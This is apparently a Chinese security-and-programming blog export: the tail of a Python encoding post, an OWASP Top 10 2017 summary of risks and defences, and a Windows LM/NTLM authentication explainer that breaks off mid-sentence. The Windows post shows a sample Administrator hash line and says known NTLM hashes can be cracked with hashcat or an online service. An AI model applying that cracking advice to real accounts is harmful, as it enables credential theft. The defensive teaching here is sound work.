</span>s.encode()<br><span class="hljs-string">b&#x27;Python\xe4\xb9\x8b\xe7\xa6\x85&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s.encode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br><span class="hljs-string">b&#x27;Python\xd6\xae\xec\xf8&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-string">b&#x27;Python\xe4\xb9\x8b\xe7\xa6\x85&#x27;</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>s = <span class="hljs-string">&quot;Python&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>s.encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><span class="hljs-string">b&#x27;Python&#x27;</span><br></code></pre></td></tr></table></figure><p>decode 负责字节到字符的解码转换，默认使用 UTF-8 编码格式进行转换：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">b&#x27;Python\xe4\xb9\x8b\xe7\xa6\x85&#x27;</span>.decode()<br><span class="hljs-string">&#x27;Python之禅&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">b&#x27;Python\xd6\xae\xec\xf8&#x27;</span>.decode(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br><span class="hljs-string">&#x27;Python之禅&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>ASCII、Unicode、UTF-8 区别：</p><ul><li><p>ASCII 编码使用 1 个字节，将最高位置为 0，后七位从 0 到 127 分别对每一个符号编码，能表示的字符十分有限；</p></li><li><p>由于很多符号 ASCII 没办法表示，各国又在 ASCII 的基础上创建了适合自己语言的符号编码表，比如欧洲的 ISO，中国 GBK ……一时间天下大乱；</p></li><li><p>为了解决编码混乱的问题，Unicode 编码收纳了全世界大部分的字符，从 0 一直编到了 100 多万，每一个区间都对应着一种语言的编码。所有的字符都有了唯一的编号，也就解决了编解码的冲突；</p></li><li><p>但是 Unicode 没有为编码的二进制编解码做出规定，因此就出现了 UTF-8，UTF-16，UTF-32 这些编码方案。其中 UTF-16 使用 2 个字节来编码所有的字符，UTF-32 则选择用 4 个字节来编码，而使用最多的就是 UTF-8 编码方案；</p></li><li><p>UTF-8 为了节省资源，采用变长编码，把一个 Unicode 字符根据不同字符内容编码成 1-6 个字节，可以显示中文（3 字节），同时兼容 ASCII 编码：</p><p><img src="/img/Python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/689802-464e92357be25120.png"></p></li></ul></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>用一张图来总结一下上述的区别和联系：</p><p><img src="/img/Python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81/689802-0c26f194d6dbc917.png"></p>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python3</tag>
      
      <tag>字符编码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASP 学习笔记</title>
    <link href="/post/OWASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/post/OWASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>再次学习 OWASP，本文仅仅作为一个概述，详细的内容以后有时间会慢慢补充。</p><h2 id="0x00-十项最严重的-Web-应用程序安全风险-2017"><a href="#0x00-十项最严重的-Web-应用程序安全风险-2017" class="headerlink" title="0x00 十项最严重的 Web 应用程序安全风险 - 2017"></a>0x00 十项最严重的 Web 应用程序安全风险 - 2017</h2><p>1、TOP 1  注入<br>2、TOP 2  失效的身份认证<br>3、TOP 3  敏感数据泄漏<br>4、TOP 4  XML 外部实体<br>5、TOP 5  失效的访问控制<br>6、TOP 6  安全配置错误<br>7、TOP 7  XSS 跨站脚本<br>8、TOP 8  不安全的反序列化<br>9、TOP 9  使用含有已知漏洞的组件<br>10、TOP 10  不足的日志记录和监控</p><h2 id="0x01-注入"><a href="#0x01-注入" class="headerlink" title="0x01 注入"></a>0x01 注入</h2><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如 SQL 注入、NoSQL 注入、OS 注入和 LDAP 注入的注入缺陷，攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p><p><strong>威胁来源</strong></p><p>注入漏洞十分普遍，且很容易通过代码审查发现，扫描器和模糊测试工具都可以帮助攻击者找到这些漏洞。而且几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部 Web 服务，当攻击者可以向解释器发送恶意数据时，就会产生注入漏洞。</p><p><strong>影响</strong></p><p>注入可能导致数据丢失、破坏或泄露给无授权方，使服务器缺乏可审计性或是拒绝服务，有时甚至能导致服务器被完全接管。</p><p><strong>防范</strong></p><p>防止注入漏洞的核心是要将数据与命令语句、查询语句分隔开，代码审计是最有效的检测应用程序的注入风险的办法之一，其次可以：</p><ul><li>使用安全的 API，避免完全使用解释器；</li><li>在服务器使用“白名单”规范化用户输入；</li><li>使用解释器转义语法转义特殊字符；</li><li>在查询中使用 LIMIT 和其他 SQL 控件，以防止在 SQL 注入时大量泄露记录。</li></ul><h2 id="0x02-失效的身份认证"><a href="#0x02-失效的身份认证" class="headerlink" title="0x02 失效的身份认证"></a>0x02 失效的身份认证</h2><p>通过不正确地使用应用程序的身份认证和会话管理功能，导致攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p><p><strong>威胁来源</strong></p><p>攻击者可以获得数百万的有效用户名和密码组合，包括大量溢出的凭据、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的 GPU 破解工具，攻击者也可以结合社会工程学，发现失效的身份验证并利用。</p><p><strong>影响</strong></p><p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈、用户身份盗窃、泄露法律高度保护的敏感信息等。</p><p><strong>防范</strong></p><ul><li>在可能的情况下，实现多因素身份验证 ；</li><li>不要使用默认的凭证，特别是管理员用户；</li><li>执行弱密码检测，使密码长度、复杂性符合安全策略；</li><li>限制或逐渐延迟失败的登录尝试，记录所有失败信息；</li><li>使用服务器端内置的会话管理器，在登录后生成高度复杂的新随机会话 ID，会话 ID 不能在 URL 中；</li><li>当用户不活跃时，及时使用户会话或认证令牌失效。</li></ul><h2 id="0x03-敏感数据泄漏"><a href="#0x03-敏感数据泄漏" class="headerlink" title="0x03 敏感数据泄漏"></a>0x03 敏感数据泄漏</h2><p>许多 Web 应用程序和 API 都无法正确保护敏感数据，为抵御攻击者我们需要对敏感数据加密，这些数据包括传输过程中的数据、存储的数据以及浏览器交互过程中的数据。</p><p><strong>威胁来源</strong></p><p>攻击者不是直接攻击密码，而是在传输过程中或从客户端（如浏览器）窃取密钥，发起中间人攻击，或从服务器端窃取明文数据。最常见的漏洞是对敏感信息不进行加密，或者在数据加密过程中使用不安全的密钥生成和管理机制，以及使用弱加密算法、弱协议和弱密码。</p><p><strong>影响</strong></p><p>敏感数据泄漏，通常包括很多个人敏感信息（PII），如：医疗记录、认证凭证、个人隐私、信用卡信息等，攻击者可以通过窃取或修改未加密的数据实施信用卡诈骗、身份盗窃或其他犯罪行为。</p><p><strong>防范</strong></p><p>对一些需要加密的敏感数据，至少应该做到以下几点：</p><ul><li>对系统处理、存储或传输的数据进行分类，并根据分类进行访问控制；</li><li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据；</li><li>对于没必要存放的、重要的敏感数据，应当尽快清除；</li><li>确保存储的所有敏感数据被加密；</li><li>确保传输过程中的数据被加密，如使用 HSTS（使用HTTP严格安全传输协议）；</li><li>确保使用了专用的算法存储密码，如使用 scrypt、bcrypt 或者 PBKDF2；</li><li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且保证密钥管理安全；</li><li>禁止缓存对包含敏感数据的响应；</li><li>单独验证每个安全配置项的有效性。</li></ul><h2 id="0x04-XML-外部实体"><a href="#0x04-XML-外部实体" class="headerlink" title="0x04 XML 外部实体"></a>0x04 XML 外部实体</h2><p>许多较早的或配置错误的 XML 处理器使用了 XML 文件中的外部实体引用，攻击者可以利用外部实体窃取使用 URI 文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p><p><strong>威胁来源</strong></p><p>大量 XXE 缺陷已经被发现并被公开，这些缺陷包括嵌入式设备的 XXE 缺陷、深嵌套的依赖项或集成，如果攻击者可以上传 XML 文档或者在 XML 文档中添加恶意内容，他们就能够攻击含有缺陷的 XML 处理器。</p><p><strong>影响</strong></p><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站、发起拒绝服务攻击等危害。</p><p><strong>防范</strong></p><p>对开发人员进行安全培训是识别和减少 XXE 缺陷的关键，此外，防止 XXE 缺陷还需要： </p><ul><li>尽可能使用简单的数据格式（如 JSON），避免对敏感数据进行序列化；</li><li>及时修复或更新应用程序和底层操作系统使用的所有 XML 处理器和库；</li><li>在应用程序的所有 XML 解析器中禁用 XML 外部实体和 DTD 进程；</li><li>在服务端使用“白名单”对输入进行验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据；</li><li>验证 XML 或 XSL 文件上传功能是否使用 XSD 或其他方法来验证上传的 XML 文件；</li><li>使用 SAST 工具检测源代码中的 XXE 漏洞；</li><li>使用虚拟修复程序、API 安全网关或 WAF 来检测、监控和防止 XXE 攻击。</li></ul><h2 id="0x05-失效的访问控制"><a href="#0x05-失效的访问控制" class="headerlink" title="0x05 失效的访问控制"></a>0x05 失效的访问控制</h2><p>由于未对通过身份验证的用户实施恰当的访问控制，攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><p><strong>威胁来源</strong></p><p>对访问控制的利用是渗透测试人员的一项核心技能，使用 SAST（静态应用程序安全性测试） 工具和 DAST（动态应用程序安全性测试）工具可以检测到访问控制的缺失，但不能验证其功能是否正常。</p><p><strong>影响</strong></p><p>攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。</p><p><strong>防范</strong></p><p>访问控制只有在受信服务端代码或没有服务器的 API 中有效， 这样攻击者才无法修改访问控制检查或元数据。</p><ul><li>除公有资源外，其他资源默认情况下拒绝访问；</li><li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化 CORS 使用；</li><li>禁用 Web 服务器目录列表，并确保文件元数据不存在于 Web 的根目录中；</li><li>记录失败的访问请求，并在适当时向管理员告警；</li><li>对 API 和服务器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害；</li><li>当用户注销后，服务器上的 JWT（JSON Web Token）令牌应失效。</li></ul><h2 id="0x06-安全配置错误"><a href="#0x06-安全配置错误" class="headerlink" title="0x06 安全配置错误"></a>0x06 安全配置错误</h2><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 头部配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><p><strong>威胁来源</strong></p><p>安全配置错误可以发生在一个应用程序的任何层面，包括网络服务、平台、Web 服务器、应用服务器、数据库、框架、自定义代码和预安装的虚拟机、容器和存储等。通常，攻击者能够通过未修复的漏洞、默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权访问或了解。</p><p><strong>影响</strong></p><p>这些漏洞使攻击者能访问一些未授权的系统数据或功能，严重的时候可能会导致系统被完全攻破。 </p><p><strong>防范</strong></p><p>应实施安全的应用部署过程，包括： </p><ul><li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例，移除或不安装不适用的功能和框架；</li><li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，特别注意云存储权限；</li><li>使用能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组；</li><li>使用 HTTP 安全头部向客户端发送指令；</li><li>在所有环境中能够进行正确并自动化的安全配置。</li></ul><h2 id="0x07-XSS-跨站脚本"><a href="#0x07-XSS-跨站脚本" class="headerlink" title="0x07 XSS 跨站脚本"></a>0x07 XSS 跨站脚本</h2><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML 或 JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本、劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><p><strong>威胁来源</strong></p><p>XSS 是 OWASP Top10 中第二普遍的安全问题，存在于近三分之二的应用中，自动化工具能够检测并利用所有三种形式的 XSS ，并且存在方便攻击者利用漏洞的框架。 </p><p><strong>影响</strong></p><p>反射型 XSS 和 DOM 型 XSS 的影响是中等的，而存储型 XSS 的影响更为严重，如可以在受害者的浏览器上执行远程代码、窃取凭证和会话记录或传递恶意软件等。</p><p><strong>防范</strong></p><p>防止 XSS 需要将不可信数据与动态的浏览器内容区分开：</p><ul><li>使用从设计上就会自动编码来解决 XSS 问题的框架，如 Ruby 3.0 或 React JS；</li><li>为了避免反射式或存储式的 XSS 漏洞，最好的办法是根据 HTML 输出的上下文对所有不可信的 HTTP 请求数据进行恰当的转义；</li><li>在客户端修改浏览器文档时，为了避免 DOM XSS 攻击，最好的选择是实施上下文敏感数据编码；</li><li>对抗 XSS 的深度防御策略是使用 CSP 内容安全策略。</li></ul><h2 id="0x08-不安全的反序列化"><a href="#0x08-不安全的反序列化" class="headerlink" title="0x08 不安全的反序列化"></a>0x08 不安全的反序列化</h2><p>不安全的反序列化会导致远程代码执行，即使有些反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行重放攻击、注入攻击和特权升级攻击等。</p><p><strong>威胁来源</strong></p><p>对反序列化的利用比较困难，因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难被使用。有些工具可以被用于发现反序列化缺陷，但仍需要人工帮助来验证发现的问题。</p><p><strong>影响</strong></p><p>反序列化缺陷的影响不能被低估，它可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。</p><p><strong>防范</strong></p><p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体，其次可以：</p><ul><li>执行完整性检查，如对任何序列化对象进行数字签名，以防止恶意用户创建或篡改数据；</li><li>在创建对象之前强制执行严格的类型约束，但是绕过这种技术的方法已经被证明，完全依赖于它并不可取；</li><li>如果可能，隔离运行那些在低特权环境中反序列化的代码；</li><li>记录反序列化的例外情况和失败信息，如传入的类型不是预期的类型，或者反序列处理引发的例外情况；</li><li>限制或监视来自于容器或服务器传入和传出的反序列化网络连接；</li><li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li></ul><h2 id="0x09-使用含有已知漏洞的组件"><a href="#0x09-使用含有已知漏洞的组件" class="headerlink" title="0x09 使用含有已知漏洞的组件"></a>0x09 使用含有已知漏洞的组件</h2><p>如果应用程序中含有已知漏洞的组件，则有可能被攻击者利用，会造成严重的数据丢失或服务器接管。</p><p><strong>威胁来源</strong></p><p>很多时候组件都是以与应用相同的权限运行的，这使得组件里的缺陷可能导致各式各样的问题，这些缺陷可能是偶然的，比如编码错误，也可能是蓄意的，比如软件后门。对一些漏洞而言很容易找到其利用程序，对于某些漏洞则需要定制开发。</p><p><strong>影响</strong></p><p>虽然对于一些已知的漏洞其影响很小，但目前很多严重的安全事件都是利用组件中的已知漏洞，根据你所要保护的资产，此类风险等级可能会很高。</p><p><strong>防范</strong></p><p>应该制定一个补丁管理流程：</p><ul><li>移除不使用的依赖、不需要的功能、组件、文件和文档；</li><li>利用工具持续记录客户端和服务端所依赖库的版本信息，订阅关于所使用组件安全漏洞的警告邮件，并监控如 CVE 和 NVD 等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能；</li><li>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险；</li><li>监控那些不再维护或者不发布安全补丁的库和组件；</li><li>如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。 </li><li>每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置。</li></ul><h2 id="0x10-不足的日志记录和监控"><a href="#0x10-不足的日志记录和监控" class="headerlink" title="0x10 不足的日志记录和监控"></a>0x10 不足的日志记录和监控</h2><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间在 200 天之后，且通常是外部检测方检测到的，而不是通过内部流程或监控检测。</p><p><strong>威胁来源</strong></p><p>对不足的日志记录和监控的利用几乎是每一个重大安全事件的温床，攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。</p><p><strong>影响</strong></p><p>多数成功的攻击往往从漏洞探测开始，允许这种探测将会大大提高攻击者攻击成功的可能性。</p><p><strong>防范</strong></p><p>根据应用程序存储或处理的数据的风险：</p><ul><li>确保所有登录、访问控制失败、输入验证失败都能被记录到日志中去，并保留足够的用户上下文信息，以识别可疑账户或恶意帐户，并为后期取证预留足够的信息；</li><li>确保日志以一种能被集中管理的形式生成； </li><li>确保高额交易有完整性控制的审计信息，以防止被篡改或删除；</li><li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被即使发现和应对； </li><li>建立或采取一个应急响应机制和恢复计划。</li></ul><p><strong>参考文章：</strong><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf">OWASP Top 10 2017.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OWASP</tag>
      
      <tag>Web漏洞</tag>
      
      <tag>SQL</tag>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集思路</title>
    <link href="/post/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/"/>
    <url>/post/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>常见的内网信息搜集目标和信息搜集思路，如下图所示：</p><p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="内网信息搜集"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息搜集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 安全认证机制探究</title>
    <link href="/post/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/"/>
    <url>/post/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>Windows 身份认证有 NTLM 和 Kerberos 两种协议，前者主要应用于 Windows NT 和 Windows 2000 Server 及之后的工作组环境，而后者则主要应用于 Windows 2000 Server 及之后的域环境。NTLM 是 Windows 早期版本的标准安全协议，认证过程相对简单；而 Kerberos 较之 NTLM 更高效、更安全，同时认证过程也相对复杂。本文将围绕这两种协议，对 Windows 安全认证机制中涉及到的内容进行初步探究。</p><h2 id="0x01-Windows-Hash-类型"><a href="#0x01-Windows-Hash-类型" class="headerlink" title="0x01 Windows Hash 类型"></a>0x01 Windows Hash 类型</h2><p>Windows 系统使用两种方法对用户的密码进行哈希处理，它们分别是 LAN Manager 哈希（LM Hash）和 NT LAN  Manager 哈希（NTLM Hash）。</p><h3 id="LM-型哈希"><a href="#LM-型哈希" class="headerlink" title="LM 型哈希"></a>LM 型哈希</h3><p>LM Hash 是 Windows 系统所用的第一种密码哈希算法，它只有一个版本且一直用到了 NTLM 哈希的出现，在 Windows Vista 和 Windows Server 2008 以前的系统中使用。</p><p>LM 型哈希对一个密码的处理过程如下：</p><ol><li>将用户的明文口令全部转换成大写形式（用户口令被限制为最多14个字符）；</li><li>将口令转换为16进制字符串，不足14个字节要求在后面用0补全；</li><li>将新得到的用户口令从中间一分为二，每一半分别包含7个字节；</li><li>将每部分转换成56 bit 的比特流，长度不足56 bit 要求使用0在左边补齐长度，再分7 bit 为一组末尾加0，组成新的64 bit编码；</li><li>将上述得到的两组8字节编码，分别作为 DES 密钥加密字符串 **KGS!@#$%**，得到两个8字节的16进制密文；</li><li>将两组8字节的密文拼接，最终得到 LMHash 值。</li></ol><h3 id="NTLM-型哈希"><a href="#NTLM-型哈希" class="headerlink" title="NTLM 型哈希"></a>NTLM 型哈希</h3><p>NTLM 型哈希也被称为 <strong>NTHash</strong>，由于 IBM 设计的 LM Hash 算法存在几个弱点，因此在 Windows Vista 和 Windows Server 2008 及之后的 Windows 系统中 LM Hash 被弃用，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash 便应运而生。NTLM Hash 以 MD4 散列算法为基础，在实现起来实际上更为简单。</p><p>NTLM 型哈希对一个密码的处理过程如下：</p><ol><li>将密码字符串转化为 ASCII 字符串（123456 -&gt; 49 50 51 52 53 54）；</li><li>将 ASCII 字符串转换为十六进制字符串（49 50 51 52 53 54 -&gt; 31 32 33 34 35 36）； </li><li>将十六进制字符串转化为 Unicode 字符串（31 32 33 34 35 36 -&gt; 310032003300340035003600）；</li><li>对 Unicode 字符串使用 MD4 散列算法，得到16字节的 NTLM Hash 值（310032003300340035003600 -&gt; 32ed87bdb5fdc5e9cba88547376818d4）。</li></ol><p>与 LM Hash 算法相比，NTLM Hash 对明文口令大小写敏感，且无法根据 NTLM Hash 判断原始明文口令是否小于8字节，摆脱了魔术字符串 KGS!@#$%。另外相较于 DES 加密，MD4 哈希算法被认为要强壮得多，因为它允许使用更长的密码，允许有大小写的不同，而且也无须把密码分割成更小、更易于被破解的块。</p><p><strong>NTLM Hash 与 Net-NTLM Hash 的区别</strong></p><p>NTLM Hash 通常是指 Windows 系统下 Security Account Manager 中保存的用户密码 hash，Net-NTLM Hash 通常是指网络环境下用于网络身份认证（例如 NTLM 认证）中的 hash，如 Net-NTLMv1 和 Net-NTLMv2。</p><h3 id="Windows-Hash-密码格式"><a href="#Windows-Hash-密码格式" class="headerlink" title="Windows  Hash 密码格式"></a>Windows  Hash 密码格式</h3><p>格式为：<code>用户名称:RID:LMHash:NTHash</code></p><blockquote><p>例如：<br>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</p><p>表示：<br>用户名称为：Administrator<br>RID 为：500<br>LM Hash 值为：C8825DB10F2590EAAAD3B435B51404EE<br>NTLM Hash 值为：683020925C5D8569C23AA724774CE6CC</p></blockquote><p>如果你知道某个用户的 NTLM Hash 密码了，可以使用 hashcat 进行破解，或者到 <a href="http://www.objectif-securite.ch/en/ophcrack.php">这个网站</a> 进行在线破解。</p><h3 id="Windows-下各类-HASH-比较"><a href="#Windows-下各类-HASH-比较" class="headerlink" title="Windows 下各类 HASH 比较"></a>Windows 下各类 HASH 比较</h3><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/20180715111518-4cceec08-87dd-1.png"></p><h2 id="0x02-Windows-域和工作组"><a href="#0x02-Windows-域和工作组" class="headerlink" title="0x02 Windows 域和工作组"></a>0x02 Windows 域和工作组</h2><p>局域网上的资源需要管理，<strong>域（Domain）</strong>和 <strong>工作组（Work Group）</strong>就是两种不同的网络资源管理模式，两者之间的基本区别在于资源的共享方式和管理用户的方法不同，主要根据 LAN 的规模来区别使用，Windows 计算机不能同时属于域与工作组。</p><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组是一群计算机的集合，它仅仅是一个逻辑的集合，组中每台计算机还是单独管理的，如果要访问其中的计算机，则需要到被访问计算机上进行用户验证，这增加了访问的复杂程度。例如想要通过工作组控制用户访问共享文件，当一台计算机设定了密码后，其他计算机每次在访问这台电脑中的共享文件时都必须输入密码。</p><p>加入工作组的方法很简单，如果在 LAN 上的计算机设置了相同的工作组名称，<strong>网络</strong> 中就会将这些计算机将显示在同一个工作组中。你可以随便加入同一网络上的任何工作组，也可以随时退出某个工作组，只要将工作组名称改动即可。工作组就像一个可以自由加入和退出的俱乐部一样，它本身的作用仅仅是提供一个“房间”，以便同一 LAN 下的计算机可以共享资源。 </p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>与工作组的松散的“会员制”有所不同，域是一个相对严格的组织，是一个有 <strong>安全边界</strong> 的计算机集合。在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器时，不需要在访问的计算机上再次进行身份验证。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的计算机和用户的验证工作，相当于一个单位的门卫一样，这个服务器被称为 <strong>域控制器（Domain  Controller，DC）</strong>。域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息。当计算机联入网络时，域控制器首先要鉴别这台计算机是否是属于这个域的，用户使用的账号/口令是否正确，认证成功后，再访问这个域中的共享文件时就无须每次输入密码了。</p><p>关于林根域的概念具体见这篇文章：<a href="http://angerfire.blog.51cto.com/198455/144123/">图解域域树域林根域的含义</a></p><h3 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h3><p>域用户的帐号和密码是不在本机的，全部保存在域控制器上，而工作组中帐号和密码都保存在本地。</p><p>域和工作组适用的环境不同，<strong>域一般是用在比较大的网络里</strong>，工作组则较小。</p><p>在一个域中需要有一台域控服务器，对其他计算机的互相访问进行管理；而在工作组中所有的计算机都是对等的，也就没有了服务器和客户机之分，但是和域一样，工作组中也存在一台组控服务器（以选举的方式产生，不固定），用于存储和这个组相关的信息。如果一台计算机想访问组中其他的计算机时，首先也要找到这个组中的组控服务器，得到工作组的信息，然后继续访问。</p><h2 id="0x03-NTLM-身份认证"><a href="#0x03-NTLM-身份认证" class="headerlink" title="0x03 NTLM 身份认证"></a>0x03 NTLM 身份认证</h2><p>NTLM 是 Windows NT 早期版本的标准安全协议，为用户提供认证、完整性和机密性保障，因向后兼容而被保留下来，有 NTLMv1，NTLMv2，NTLMv2 session 三种版本。</p><h3 id="NTML-认证过程"><a href="#NTML-认证过程" class="headerlink" title="NTML 认证过程"></a>NTML 认证过程</h3><p>NTLM 是一种挑战/响应（Challenge/Response）形式的验证机制，主要包括三类消息类型：</p><ul><li><p>Type1  message：协商（negotiation）</p><p>客户端在发起认证时，首先向服务器发送协商消息。协商需要认证的主体、用户、机器以及需要使用的安全服务等信息，并通知服务器自己支持的协议内容、加密等级等。</p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-eeb88612cb73ea1f.jpg"></p><ul><li><p>Type2  message：挑战（challenge）</p><p>服务器在收到客户端的协商消息之后，会读取其中的内容，从中选择出自己所能接受的服务内容，比如加密等级，安全服务等，并生成一个随机数 challenge，然后生成挑战消息返回给客户端。 </p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-b1a7ab377044b2fb.jpg"></p><ul><li><p>Type3  message：认证（authentication）</p><p>客户端在收到服务器返回的 challenge 消息后，读取服务器所支持的内容和随机数 challenge，决定服务器所支持的内容是否满足自己的要求。如果满足，则使用自己的 password hash 加密 challenge， 并最终生成一个认证消息发送给服务器。 </p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-114b90a7b8f7eb32.jpg"></p><p>下面来详细解析 NTLM 验证过程，一共分为七步：</p><ol><li>用户访问客户端计算机并提供域名（domain name）、用户名（user name）和口令（password）。在客户端计算口令的Hash值并保存在本地；</li><li>客户端（Client）将用户名发送给服务器（以明文形式）；</li><li> 服务器（Server）生成一个16字节的随机数，称为challenge或nonce，并将其发送给客户端；</li><li>客户端收到challenge后，复制一份拷贝，然后将其中一个challenge使用用户口令的单向散列（password hash）加密，之后作为response发送给服务器。这叫做响应。</li><li>服务器在收到客户端传送过来response后，将user name，challenge以及response这三份内容发送给域控制器DC。</li><li>DC在收到user name，challenge，response后，根据user name在SAM数据库（Security Account Manager database）中找到其对应的password hash，然后用这个password hash加密challenge，得到challenge-hash；</li><li>DC将它计算出的challenge-hash（步骤6）与客户端计算出的response（步骤4）进行比较。如果他们相同，则验证成功。之后DC会将验证结果发给Server，并最终返回给Client。（如果是使用本地用户身份进行认证，则由Server本身完成认证过程。）</li></ol><blockquote><p>注：在 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">Microsoft NTLM</a> 中提到让我们不要直接使用 NTLM，而是使用 